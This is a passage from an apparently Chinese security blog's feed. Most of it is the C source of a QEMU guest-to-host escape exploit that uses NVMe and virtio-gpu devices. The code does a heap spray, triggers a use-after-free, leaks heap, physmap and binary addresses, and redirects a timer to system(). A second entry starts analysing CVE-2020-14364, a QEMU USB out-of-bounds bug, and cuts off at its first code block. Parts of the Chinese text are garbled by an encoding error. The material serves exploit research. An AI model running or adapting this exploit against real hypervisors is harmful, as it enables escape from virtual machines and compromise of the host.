class="hljs-type">uint32_t</span> padding;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">NvmeAdminCommands</span> &#123;</span><br>    NVME_ADM_CMD_DELETE_SQ      = <span class="hljs-number">0x00</span>,<br>    NVME_ADM_CMD_CREATE_SQ      = <span class="hljs-number">0x01</span>,<br>    NVME_ADM_CMD_GET_LOG_PAGE   = <span class="hljs-number">0x02</span>,<br>    NVME_ADM_CMD_DELETE_CQ      = <span class="hljs-number">0x04</span>,<br>    NVME_ADM_CMD_CREATE_CQ      = <span class="hljs-number">0x05</span>,<br>    NVME_ADM_CMD_IDENTIFY       = <span class="hljs-number">0x06</span>,<br>    NVME_ADM_CMD_ABORT          = <span class="hljs-number">0x08</span>,<br>    NVME_ADM_CMD_SET_FEATURES   = <span class="hljs-number">0x09</span>,<br>    NVME_ADM_CMD_GET_FEATURES   = <span class="hljs-number">0x0a</span>,<br>    NVME_ADM_CMD_ASYNC_EV_REQ   = <span class="hljs-number">0x0c</span>,<br>    NVME_ADM_CMD_ACTIVATE_FW    = <span class="hljs-number">0x10</span>,<br>    NVME_ADM_CMD_DOWNLOAD_FW    = <span class="hljs-number">0x11</span>,<br>    NVME_ADM_CMD_FORMAT_NVM     = <span class="hljs-number">0x80</span>,<br>    NVME_ADM_CMD_SECURITY_SEND  = <span class="hljs-number">0x81</span>,<br>    NVME_ADM_CMD_SECURITY_RECV  = <span class="hljs-number">0x82</span>,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">NvmeIoCommands</span> &#123;</span><br>    NVME_CMD_FLUSH              = <span class="hljs-number">0x00</span>,<br>    NVME_CMD_WRITE              = <span class="hljs-number">0x01</span>,<br>    NVME_CMD_READ               = <span class="hljs-number">0x02</span>,<br>    NVME_CMD_WRITE_UNCOR        = <span class="hljs-number">0x04</span>,<br>    NVME_CMD_COMPARE            = <span class="hljs-number">0x05</span>,<br>    NVME_CMD_WRITE_ZEROS        = <span class="hljs-number">0x08</span>,<br>    NVME_CMD_DSM                = <span class="hljs-number">0x09</span>,<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_STATUS20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_Q_SELECT22</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_Q_SIZE24</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_Q_ENABLE28</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_Q_DESCLO32</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_Q_DESCHI36</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_Q_AVAILLO40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_Q_AVAILHI44</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VRING_DESC_F_NEXT       1</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_GPU_CMD_RESOURCE_CREATE_2D       0x101</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_GPU_CMD_RESOURCE_DETACH_BACKING  0x106</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SHIFT  12</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span><br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">page_offset</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr)</span><br>&#123;<br>    <span class="hljs-comment">// addr &amp; 0xfff</span><br>    <span class="hljs-keyword">return</span> addr &amp; ((<span class="hljs-number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gfn</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> pme, gfn;<br>    <span class="hljs-type">size_t</span> offset;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;open&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    offset = ((<span class="hljs-type">uintptr_t</span>)addr &gt;&gt; <span class="hljs-number">9</span>) &amp; ~<span class="hljs-number">7</span>;<br>    lseek(fd, offset, SEEK_SET);<br>    read(fd, &amp;pme, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> (!(pme &amp; PFN_PRESENT))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>    gfn = pme &amp; PFN_PFN;<br>    close(fd);<br>    <span class="hljs-keyword">return</span> gfn;<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gpa</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> gfn = gva_to_gfn(addr);<br>    assert(gfn != <span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="hljs-type">uint64_t</span>)addr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_nvme_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint32_t</span> val)</span>&#123;    <br>    *(<span class="hljs-type">uint32_t</span>*)(mmio_nvme + addr) = val;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_gpu_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint32_t</span> val)</span>&#123;    <br>    *(<span class="hljs-type">uint32_t</span>*)(mmio_gpu + addr) = val;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init_nvme</span><span class="hljs-params">()</span> &#123;<br>    mmio_nvme_write(<span class="hljs-number">0x14</span>, <span class="hljs-number">0</span>);<span class="hljs-comment">// nvme_clear_ctrl</span><br>    mmio_nvme_write(<span class="hljs-number">0x24</span>, <span class="hljs-number">0xff00ff</span>);         <span class="hljs-comment">// n-&gt;bar.aqa</span><br>mmio_nvme_write(<span class="hljs-number">0x28</span>, gva_to_gpa(nvme_cmd));<br>mmio_nvme_write(<span class="hljs-number">0x2c</span>, gva_to_gpa(nvme_cmd) &gt;&gt; <span class="hljs-number">32</span>);<br><br><span class="hljs-type">uint32_t</span> data = <span class="hljs-number">1</span>;<br>data |= <span class="hljs-number">6</span> &lt;&lt; <span class="hljs-number">16</span>;<span class="hljs-comment">//  sqes</span><br>data |= <span class="hljs-number">4</span> &lt;&lt; <span class="hljs-number">20</span>;<span class="hljs-comment">//cqes</span><br>mmio_nvme_write(<span class="hljs-number">0x14</span>, data);<span class="hljs-comment">// nvme_start_ctrl</span><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">nvme_inc_sq_head</span><span class="hljs-params">()</span>&#123;<br>    sq_tail = sq_tail + <span class="hljs-number">1</span>;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">nvme_create_cq</span><span class="hljs-params">(<span class="hljs-type">int</span> cqid)</span>&#123;<br>    nvme_cmd[sq_tail].opcode = NVME_ADM_CMD_CREATE_CQ;<br>    nvme_cmd[sq_tail].prp1 = gva_to_gpa(nvme_buf);<br><br>    NvmeCreateCq *nvme_create = (NvmeCreateCq *)(nvme_cmd + sq_tail);<br>    nvme_create-&gt;cqid = cqid;<br>    nvme_create-&gt;irq_vector = <span class="hljs-number">1</span>;<br>    nvme_create-&gt;cq_flags = <span class="hljs-number">1</span>;<br>    nvme_create-&gt;qsize = <span class="hljs-number">1</span>;<br>    nvme_inc_sq_head();<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">nvme_create_sq</span><span class="hljs-params">(<span class="hljs-type">int</span> sqid, <span class="hljs-type">int</span> qsize)</span>&#123;<br>    <br>    nvme_cmd[sq_tail].opcode = NVME_ADM_CMD_CREATE_SQ;<br>    nvme_cmd[sq_tail].prp1 = gva_to_gpa(nvme_buf);<br>    <br>    NvmeCreateSq *nvme_create = (NvmeCreateSq *)(nvme_cmd + sq_tail);<br>    nvme_create-&gt;cqid = <span class="hljs-number">1</span>;<br>    nvme_create-&gt;sqid = sqid;<br>    nvme_create-&gt;sq_flags = <span class="hljs-number">1</span>;<br>    nvme_create-&gt;qsize = qsize;<br>    nvme_inc_sq_head();<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">nvme_del_sq</span><span class="hljs-params">(<span class="hljs-type">int</span> sqid)</span>&#123;<br>    nvme_cmd[sq_tail].opcode = NVME_ADM_CMD_DELETE_SQ;<br>    NvmeCreateSq *nvme_del = (NvmeCreateSq *)(nvme_cmd + sq_tail);<br>    nvme_del-&gt;sqid = sqid;<br>    nvme_inc_sq_head();<br>    mmio_nvme_write(<span class="hljs-number">0x1000</span>, sq_tail);<br>    sleep(<span class="hljs-number">0.5</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">(<span class="hljs-type">int</span> sqid)</span>&#123;<br>    <span class="hljs-built_in">memset</span>(nvme_buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> NvmeCmd));<br>    nvme_cmd[<span class="hljs-number">0</span>].opcode = NVME_CMD_READ;<br>    nvme_cmd[<span class="hljs-number">0</span>].prp1 = <span class="hljs-number">0xfe000000</span> + <span class="hljs-number">0xc00</span>;<br>    nvme_cmd[<span class="hljs-number">0</span>].nsid = <span class="hljs-number">1</span>;<br>    NvmeRwCmd *rwcmd = (NvmeRwCmd *)(nvme_cmd);<br>    rwcmd-&gt;nlb = <span class="hljs-number">7</span>;<br>    rwcmd-&gt;slba = <span class="hljs-number">1</span>;<br>    mmio_nvme_write(<span class="hljs-number">0x1000</span> + sqid * <span class="hljs-number">8</span>, <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init_gpu</span><span class="hljs-params">()</span>&#123;<br>    mmio_gpu_write(VIRTIO_PCI_COMMON_STATUS, <span class="hljs-number">0</span>);<br>    mmio_gpu_write(VIRTIO_PCI_COMMON_Q_SELECT, <span class="hljs-number">0</span>);<br>    mmio_gpu_write(VIRTIO_PCI_COMMON_Q_SIZE, <span class="hljs-number">0x100</span>);<br>    mmio_gpu_write(VIRTIO_PCI_COMMON_Q_DESCLO, gva_to_gpa(desc));<br>    mmio_gpu_write(VIRTIO_PCI_COMMON_Q_DESCHI, <span class="hljs-number">0</span>);<br>    mmio_gpu_write(VIRTIO_PCI_COMMON_Q_AVAILLO, gva_to_gpa(avail));<br>    mmio_gpu_write(VIRTIO_PCI_COMMON_Q_AVAILHI, <span class="hljs-number">0</span>);<br>    mmio_gpu_write(VIRTIO_PCI_COMMON_Q_ENABLE, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_mapping_table</span><span class="hljs-params">()</span>&#123;<br>    avail-&gt;idx = <span class="hljs-number">2</span>;<br>    avail-&gt;ring[vq_last_avail_idx ++] = <span class="hljs-number">0</span>;<br>    avail-&gt;ring[vq_last_avail_idx ++] = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_resource_create_2d</span> *<span class="hljs-title">c2d</span> =</span> buf + <span class="hljs-number">0x100</span>;<br>    c2d-&gt;hdr.type = VIRTIO_GPU_CMD_RESOURCE_CREATE_2D;<br>    c2d-&gt;resource_id = <span class="hljs-number">1</span>;<br>    c2d-&gt;format = <span class="hljs-number">1</span>;<br>    c2d-&gt;width = <span class="hljs-number">0x100</span>;<br>    c2d-&gt;height = <span class="hljs-number">0x100</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_resource_attach_backing</span> *<span class="hljs-title">ab</span> =</span> buf + <span class="hljs-number">0x200</span>;<br>    ab-&gt;hdr.type = VIRTIO_GPU_CMD_RESOURCE_DETACH_BACKING;<br>    ab-&gt;resource_id = <span class="hljs-number">1</span>;<br>    ab-&gt;nr_entries = <span class="hljs-number">20</span>;<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_mem_entry</span> *<span class="hljs-title">ents</span> =</span> buf + <span class="hljs-number">0x300</span>;<br>    ents[<span class="hljs-number">0</span>].addr = gva_to_gpa(payload_buf + <span class="hljs-number">2</span>);<br>    ents[<span class="hljs-number">0</span>].length = <span class="hljs-number">0x100</span>;<br>    ents[<span class="hljs-number">1</span>].addr = <span class="hljs-number">0</span>;<br>    ents[<span class="hljs-number">1</span>].length = <span class="hljs-number">0</span>;<br><br>    desc[<span class="hljs-number">0</span>].flags = <span class="hljs-number">0</span>;<br>    desc[<span class="hljs-number">0</span>].addr = gva_to_gpa(c2d);<br>    desc[<span class="hljs-number">0</span>].len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> virtio_gpu_resource_create_2d);<br><br>    desc[<span class="hljs-number">1</span>].flags = VRING_DESC_F_NEXT;<br>    desc[<span class="hljs-number">1</span>].addr = gva_to_gpa(ab);<br>    desc[<span class="hljs-number">1</span>].len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> virtio_gpu_resource_attach_backing);<br>    desc[<span class="hljs-number">1</span>].next = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt; <span class="hljs-number">20</span>; i++)&#123;<br>        desc[i].flags = VRING_DESC_F_NEXT;<br>        desc[i].addr = gva_to_gpa(ents);<br>        desc[i].len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> virtio_gpu_mem_entry);<br>        desc[i].next = i + <span class="hljs-number">1</span>;<br>    &#125;<br>    desc[<span class="hljs-number">7</span>].addr = gva_to_gpa(ents + <span class="hljs-number">1</span>);<br>    desc[<span class="hljs-number">20</span>].flags = <span class="hljs-number">0</span>;<br>    desc[<span class="hljs-number">20</span>].addr = gva_to_gpa(buf + <span class="hljs-number">0x40</span>);<br>    desc[<span class="hljs-number">20</span>].len = <span class="hljs-number">0x20</span>;<br><br>    mmio_gpu_write(<span class="hljs-number">0x3000</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_mapping_table1</span><span class="hljs-params">()</span>&#123;<br>    avail-&gt;idx = <span class="hljs-number">3</span>;<br>    avail-&gt;ring[vq_last_avail_idx ++] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_resource_create_2d</span> *<span class="hljs-title">c2d</span> =</span> buf + <span class="hljs-number">0x100</span>;<br>    c2d-&gt;hdr.type = VIRTIO_GPU_CMD_RESOURCE_CREATE_2D;<br>    c2d-&gt;resource_id = <span class="hljs-number">2</span>;<br>    c2d-&gt;format = <span class="hljs-number">1</span>;<br>    c2d-&gt;width = <span class="hljs-number">0x100</span>;<br>    c2d-&gt;height = <span class="hljs-number">0x100</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_resource_attach_backing</span> *<span class="hljs-title">ab</span> =</span> buf + <span class="hljs-number">0x200</span>;<br>    ab-&gt;hdr.type = VIRTIO_GPU_CMD_RESOURCE_DETACH_BACKING;<br>    ab-&gt;resource_id = <span class="hljs-number">2</span>;<br>    ab-&gt;nr_entries = <span class="hljs-number">20</span>;<br>    <br>    desc[<span class="hljs-number">0</span>].flags = VRING_DESC_F_NEXT;<br>    desc[<span class="hljs-number">0</span>].addr = gva_to_gpa(c2d);<br>    desc[<span class="hljs-number">0</span>].len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> virtio_gpu_resource_create_2d);<br>    desc[<span class="hljs-number">0</span>].next = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">21</span>; i++)&#123;<br>        desc[i].flags = VRING_DESC_F_NEXT;<br>        desc[i].addr = gva_to_gpa(exec_cmd);<br>        desc[i].len = <span class="hljs-number">0x20</span>;<br>        desc[i].next = i + <span class="hljs-number">1</span>;<br>    &#125;<br><br>    desc[<span class="hljs-number">21</span>].flags = <span class="hljs-number">0</span>;<br>    desc[<span class="hljs-number">21</span>].addr = gva_to_gpa(exec_cmd);<br>    desc[<span class="hljs-number">21</span>].len = <span class="hljs-number">0x20</span>;<br><br>    mmio_gpu_write(<span class="hljs-number">0x3000</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_mapping_table2</span><span class="hljs-params">()</span>&#123;<br>    avail-&gt;idx = <span class="hljs-number">5</span>;<br>    avail-&gt;ring[vq_last_avail_idx ++] = <span class="hljs-number">0</span>;<br>    avail-&gt;ring[vq_last_avail_idx ++] = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_resource_create_2d</span> *<span class="hljs-title">c2d</span> =</span> buf + <span class="hljs-number">0x100</span>;<br>    c2d-&gt;hdr.type = VIRTIO_GPU_CMD_RESOURCE_CREATE_2D;<br>    c2d-&gt;resource_id = <span class="hljs-number">3</span>;<br>    c2d-&gt;format = <span class="hljs-number">1</span>;<br>    c2d-&gt;width = <span class="hljs-number">0x100</span>;<br>    c2d-&gt;height = <span class="hljs-number">0x100</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_resource_attach_backing</span> *<span class="hljs-title">ab</span> =</span> buf + <span class="hljs-number">0x200</span>;<br>    ab-&gt;hdr.type = VIRTIO_GPU_CMD_RESOURCE_DETACH_BACKING;<br>    ab-&gt;resource_id = <span class="hljs-number">3</span>;<br>    ab-&gt;nr_entries = <span class="hljs-number">20</span>;<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_mem_entry</span> *<span class="hljs-title">ents</span> =</span> buf + <span class="hljs-number">0x300</span>;<br>    ents[<span class="hljs-number">0</span>].addr = gva_to_gpa(payload_buf + <span class="hljs-number">2</span>);<br>    ents[<span class="hljs-number">0</span>].length = <span class="hljs-number">0x100</span>;<br>    ents[<span class="hljs-number">1</span>].addr = <span class="hljs-number">0</span>;<br>    ents[<span class="hljs-number">1</span>].length = <span class="hljs-number">0</span>;<br><br>    desc[<span class="hljs-number">0</span>].flags = <span class="hljs-number">0</span>;<br>    desc[<span class="hljs-number">0</span>].addr = gva_to_gpa(c2d);<br>    desc[<span class="hljs-number">0</span>].len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> virtio_gpu_resource_create_2d);<br><br>    desc[<span class="hljs-number">1</span>].flags = VRING_DESC_F_NEXT;<br>    desc[<span class="hljs-number">1</span>].addr = gva_to_gpa(ab);<br>    desc[<span class="hljs-number">1</span>].len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> virtio_gpu_resource_attach_backing);<br>    desc[<span class="hljs-number">1</span>].next = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt; <span class="hljs-number">20</span>; i++)&#123;<br>        desc[i].flags = VRING_DESC_F_NEXT;<br>        desc[i].addr = gva_to_gpa(ents);<br>        desc[i].len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> virtio_gpu_mem_entry);<br>        desc[i].next = i + <span class="hljs-number">1</span>;<br>    &#125;<br>    desc[<span class="hljs-number">7</span>].addr = gva_to_gpa(ents + <span class="hljs-number">1</span>);<br>    desc[<span class="hljs-number">20</span>].flags = <span class="hljs-number">0</span>;<br>    desc[<span class="hljs-number">20</span>].addr = gva_to_gpa(buf + <span class="hljs-number">0x40</span>);<br>    desc[<span class="hljs-number">20</span>].len = <span class="hljs-number">0x20</span>;<br><br>    mmio_gpu_write(<span class="hljs-number">0x3000</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span>  mmio_fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);<br>    mmio_nvme         = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-type">int</span>  mmio_fd1 = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:05.0/resource4&quot;</span>, O_RDWR | O_SYNC);<br>    mmio_gpu         = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x4000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd1, <span class="hljs-number">0</span>);<br><br>    buf = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    avail = buf;<br>    payload_buf = buf + <span class="hljs-number">0x400</span>;<br><br>    desc_buf = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">memset</span>(desc_buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    desc = desc_buf;<br><br>    nvme_buf = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">memset</span>(nvme_buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    nvme_cmd = nvme_buf;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] STEP 1 heap spray&quot;</span>);<br>    init_nvme();<br>    sleep(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">0x28</span>; ++i)&#123;<br>        nvme_create_cq(i);<br>    &#125;<br>    mmio_nvme_write(<span class="hljs-number">0x1000</span>, sq_tail);<br>    sleep(<span class="hljs-number">1</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] STEP 2 set mapping table for free&quot;</span>);<br>    init_gpu();<br>    set_mapping_table();<br>    sleep(<span class="hljs-number">1</span>);<br>    <span class="hljs-comment">//æœ¬åœ°åˆå§‹0x150çš„tcacheåªæœ‰4ä¸ªï¼Œg_free(ents)åentsä¹Ÿä¼šè¿›å…¥ï¼Œæ‰€ä»¥éœ€è¦å¤šåˆ›å»ºä¸€ä¸ªsq</span><br>    nvme_create_sq(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>);<br>    nvme_create_sq(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>);<br>    mmio_nvme_write(<span class="hljs-number">0x1000</span>, sq_tail);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] STEP 3 free the vuln_addr&quot;</span>);<br>    payload_buf[<span class="hljs-number">1</span>] = <span class="hljs-number">0x291</span>;<br>    payload_buf[<span class="hljs-number">0x53</span>] = <span class="hljs-number">0x21</span>;<br>    vuln(<span class="hljs-number">2</span>);<br>    sleep(<span class="hljs-number">1</span>);<br>    <span class="hljs-type">size_t</span> leak_heap_addr = payload_buf[<span class="hljs-number">2</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_heap_addr_is %#lx\n&quot;</span>, leak_heap_addr);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] STEP 4 leak host&#x27;s physmap addr in qemu&quot;</span>);<br>    set_mapping_table1();<br>    sleep(<span class="hljs-number">1</span>);<br>    <span class="hljs-type">size_t</span> physmap_addr = payload_buf[<span class="hljs-number">0x28</span>];<br>    <span class="hljs-type">size_t</span> physmap_base = physmap_addr - gva_to_gpa(exec_cmd);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_host_physmap_addr_is %#lx\n&quot;</span>, physmap_addr);<br>    sleep(<span class="hljs-number">1</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] STEP 5 free vuln_addr&quot;</span>);<br>    payload_buf = buf + <span class="hljs-number">0x800</span>;<br>    set_mapping_table2();<br>    nvme_create_sq(<span class="hljs-number">3</span>, <span class="hljs-number">1</span>);<br>    nvme_create_sq(<span class="hljs-number">4</span>, <span class="hljs-number">1</span>);<br>    mmio_nvme_write(<span class="hljs-number">0x1000</span>, sq_tail);<br>    sleep(<span class="hljs-number">1</span>);<br>    payload_buf[<span class="hljs-number">1</span>] = <span class="hljs-number">0x41</span>;<br>    payload_buf[<span class="hljs-number">9</span>] = <span class="hljs-number">0x21</span>;<br>    vuln(<span class="hljs-number">4</span>);<br>    sleep(<span class="hljs-number">1</span>);<br>    nvme_create_sq(<span class="hljs-number">5</span>, <span class="hljs-number">1</span>);<br>    mmio_nvme_write(<span class="hljs-number">0x1000</span>, sq_tail);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] STEP 6 leak qemu addr and hijack timer&quot;</span>);<br>    <span class="hljs-type">size_t</span> elf_addr = payload_buf[<span class="hljs-number">4</span>];<br>    <span class="hljs-type">size_t</span> elf_base = elf_addr - <span class="hljs-number">0x517c76</span>;<br>    <span class="hljs-type">size_t</span> system_plt = elf_base + <span class="hljs-number">0x2bc790</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_elf_addr_is %#lx\n&quot;</span>, elf_addr);<br>    payload_buf[<span class="hljs-number">4</span>] = system_plt;<br>    payload_buf[<span class="hljs-number">5</span>] = physmap_addr;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] start escape&quot;</span>);<br>    mmio_nvme_write(<span class="hljs-number">0x1000</span> + <span class="hljs-number">5</span> * <span class="hljs-number">8</span>, <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€åå¼¹å‡ºè®¡ç®—å™¨</p><img src="/img/22/Screenshot 2023-10-18 214923.png" style="zoom:80%;" /><p>â€‹                                    </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2020-14364</title>
    <link href="/2023/10/11/CVE-2020-14364/"/>
    <url>/2023/10/11/CVE-2020-14364/</url>
    
    <content type="html"><![CDATA[<p>CVE-2020-14364æ˜¯qemu5.2.0ç‰ˆæœ¬å‰å­˜åœ¨çš„æ¼æ´ï¼Œå¯ä»¥å€ŸåŠ©usbè¿™ä¸ªå¸¸è§è®¾å¤‡è¿›è¡Œé€ƒé€¸ã€‚</p><p>ç¯å¢ƒæ­å»ºå’Œåˆ†æå¯ä»¥ç›´æ¥å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/8320">https://xz.aliyun.com/t/8320</a>                                       </p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>åœ¨<a href="https://elixir.bootlin.com/qemu/v4.2.1/source/hw/usb/core.c#L129">do_token_setupå‡½æ•°</a>ä¸­çš„<code>s-&gt;setup_len &gt; sizeof(s-&gt;data_buf)</code>åˆ¤æ–­å¤§å°è¶Šç•Œåï¼Œç›´æ¥è¿”å›ï¼Œä½†æ˜¯<code>s-&gt;setup_len</code>ä¸­ä¾ç„¶ä¸ºä¸€ä¸ªè¶Šç•Œçš„å¤§å°ï¼Œå¹¶ä¸”åœ¨æ¥ä¸‹æ¥çš„do_token_inå’Œdo_token_outå‡½æ•°ä¸­å¯ä»¥åˆ©ç”¨è¯¥å€¼å»è¿›è¡Œè¶Šç•Œè¯»å†™ï¼Œåœ¨æ­¤è¿‡ç¨‹ä¸­æ²¡æœ‰ä»»ä½•å¯¹<code>s-&gt;setup_len</code>çš„åˆ¤æ–­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 